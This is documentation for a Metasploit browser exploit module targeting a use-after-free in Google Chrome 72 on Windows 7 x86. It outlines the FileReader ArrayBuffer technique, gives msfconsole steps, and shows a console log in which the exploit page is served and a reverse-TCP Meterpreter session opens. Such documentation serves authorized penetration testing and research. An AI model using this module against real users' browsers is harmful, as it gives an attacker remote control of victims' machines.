## Description

The FileReader.readAsArrayBuffer function can return multiple references to the same ArrayBuffer object, which can be freed and overwritten with sprayed objects.  The dangling ArrayBuffer reference can be used to access the sprayed objects, allowing arbitrary memory access from Javascript. This is used to write and execute shellcode in a WebAssembly object.

The shellcode is executed within the Chrome sandbox, so you must explicitly disable the sandbox for the payload to be successful, e.g:

`C:\Program Files\Google\Chrome\Application>chrome.exe --no-sandbox`

## Vulnerable Application

This exploit takes advantage of a use after free vulnerability in Google Chrome 72.0.3626.119 running on Windows 7 x86.
Additional memory protections mean this exploit technique is not as straightforward on x64 versions of Windows.

## Verification Steps

1. Start msfconsole
1. Do: ```use exploit/windows/browser/chrome_filereader_uaf```
1. Do: ```Choose a payload and set any specific options```
1. Do: ```run```, after a target browses to the generated URL, you should receive a session.

## Scenarios

### Windows 7 x86 with Google Chrome 72.0.3626.119 (--no-sandbox)


```
msf5 > use exploit/windows/browser/chrome_filereader_uaf
msf5 exploit(windows/browser/chrome_filereader_uaf) > set URIPATH /
URIPATH => /
msf5 exploit(windows/browser/chrome_filereader_uaf) > set LHOST 192.168.0.1
LHOST => 192.168.0.1
msf5 exploit(windows/browser/chrome_filereader_uaf) > run
[*] Started reverse TCP handler on 192.168.0.1:4444
[*] Using URL: http://0.0.0.0:8080/
[*] Local IP: http://192.168.0.1:8080/
[*] Server started.
[*] 192.168.0.1   chrome_filereader_uaf - Sending /
[*] 192.168.0.1   chrome_filereader_uaf - Sending /favicon.ico
[*] 192.168.0.1   chrome_filereader_uaf - Sending /exploit.html
[*] 192.168.0.1   chrome_filereader_uaf - Sending /worker.js
[*] Sending stage (179779 bytes) to 192.168.0.1
[*] Meterpreter session 1 opened (192.168.0.1:4444 -> 192.168.0.1:60876) at 2019-05-06 16:49:06 +0800
```

